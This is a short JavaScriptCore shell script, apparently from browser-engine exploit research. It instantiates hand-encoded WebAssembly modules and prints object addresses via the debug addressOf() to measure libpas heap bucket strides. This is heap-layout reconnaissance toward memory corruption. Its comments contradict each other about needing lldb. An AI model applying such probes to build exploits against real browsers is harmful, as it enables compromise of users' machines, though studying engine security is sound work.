// Stride probe: allocate N back-to-back instances of each module variant,
// walk JSWebAssemblyInstance+16 → Wasm::Instance* via the shell's read64
// equivalent, and report address deltas. The delta between consecutive
// instances of the same variant is the libpas bucket stride.
//
// No lldb needed: we already know JSWebAssemblyInstance's m_instance is at
// +16 (cassowary's tt[w]=16, verified in writeup), and the jsc shell exposes
// addressOf() so we can walk it from JS.

// — module bytes (cassowary + a 3-global variant), from wasm-instance-probe.js —
const CASS = new Uint8Array([0,97,115,109,1,0,0,0,1,9,2,96,0,1,126,96,1,126,0,3,3,2,0,1,4,4,1,111,0,1,5,3,1,0,1,6,82,8,123,1,253,12,51,51,51,51,51,51,51,51,51,51,51,51,51,51,51,51,11,126,1,66,205,215,182,222,218,249,234,230,171,127,11,123,1,253,12,51,51,51,51,51,51,51,51,51,51,51,51,51,51,51,51,11,111,1,208,111,11,111,1,208,111,11,111,1,208,111,11,111,1,208,111,11,111,1,208,111,11,7,29,4,4,101,100,102,121,3,1,6,109,101,109,111,114,121,2,0,3,98,116,108,0,0,3,97,108,116,0,1,10,13,2,4,0,35,1,11,6,0,32,0,36,1,11]);
const MID  = new Uint8Array([0,97,115,109,1,0,0,0,1,9,2,96,0,1,126,96,1,126,0,3,3,2,0,1,4,4,1,111,0,1,5,3,1,0,1,6,57,3,123,1,253,12,51,51,51,51,51,51,51,51,51,51,51,51,51,51,51,51,11,126,1,66,205,215,182,222,218,249,234,230,171,127,11,123,1,253,12,51,51,51,51,51,51,51,51,51,51,51,51,51,51,51,51,11,7,29,4,4,101,100,102,121,3,1,6,109,101,109,111,114,121,2,0,3,98,116,108,0,0,3,97,108,116,0,1,10,13,2,4,0,35,1,11,6,0,32,0,36,1,11]);

let _f64 = new Float64Array(1), _u64 = new BigUint64Array(_f64.buffer);
let addr = (o) => { _f64[0] = addressOf(o); return _u64[0]; };
let hex  = (n) => '0x' + BigInt.asUintN(64, n).toString(16).padStart(12, '0');

function run(name, bytes, n) {
  let mod = new WebAssembly.Module(bytes);
  let insts = [];
  for (let i = 0; i < n; i++) insts.push(new WebAssembly.Instance(mod, {}));
  // Print JSWebAssemblyInstance addresses; lldb will deref +16 for each.
  let line = insts.map(i => hex(addr(i))).join(' ');
  print(`${name} ${line}`);
  return insts;
}

let keepC = run("CASS", CASS, 6);
let keepM = run("MID ", MID,  6);
globalThis.__keep = [keepC, keepM];
if (typeof readline === "function") readline();
